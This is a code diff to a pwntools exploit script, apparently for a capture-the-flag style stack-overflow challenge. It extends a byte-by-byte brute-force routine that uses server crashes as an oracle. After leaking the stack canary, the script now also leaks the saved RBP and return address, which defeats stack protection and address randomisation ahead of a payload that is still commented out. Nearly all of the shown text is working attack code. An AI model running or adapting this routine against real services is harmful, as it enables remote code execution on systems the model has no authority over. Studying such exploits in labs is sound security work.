@@ -77,11 +77,11 @@ config['rip_off'] = 1048
 # create a connection to the server
 # send some data
 # check if it crashed ;)
-def server_check(prefix_size, data):
+def server_check(prefix_size, data, prefix = ""):
     io = start()
     to_send = config['username'] + \
-              cyclic(prefix_size - len(config['username'])) + \
-              data
+              cyclic(prefix_size - len(config['username']) - len(prefix)) + \
+              prefix + data
     io.sendafter(PROMPT_MSG, to_send)
     recv_data = io.clean()
     io.close()
@@ -90,7 +90,7 @@ def server_check(prefix_size, data):
 
 # bruteforce a 8 byte long value on the stack
 # offset -> offset from the buffer
-def bruteforce_value(offset):
+def bruteforce_value(offset, prefix = ""):
     value = ""
     for y in range(8):
         log.info("Bruteforcing byte {}".format(y + 1))
@@ -98,7 +98,7 @@ def bruteforce_value(offset):
             temp_value = value + chr(x)
             log.info("Trying {}".format(hex(x)))
 
-            alive = server_check(offset, temp_value)
+            alive = server_check(offset, temp_value, prefix = prefix)
             if alive:
                 log.success("Found byte {}".format(hex(x)))
 
@@ -121,10 +121,19 @@ if args.LOAD:
 if 'cookie' not in config:
     config['cookie'] = bruteforce_value(config['buf_size'])
 
-#alive = check_cookie(config['cookie'], padding = True)
-#if not alive:
-#    log.error("Stack cookie is wrong")
+# we need the rbp and rip to be leaked too
+if 'rbp' not in config:
+    config['rbp'] = bruteforce_value(config['rbp_off'], prefix = config['cookie'])
+if 'rip' not in config:
+    config['rip'] = bruteforce_value(config['rip_off'],
+                                     prefix = config['cookie'] + config['rbp'])
 
+# check if leaked values are still good (debug only)
+"""
+alive = server_check(config['buf_size'], config['cookie'])
+if not alive:
+    log.error("Stack cookie is wrong")
+"""
 
 #log.info("Payload")
 #io.sendafter(PROMPT_MSG, payload)
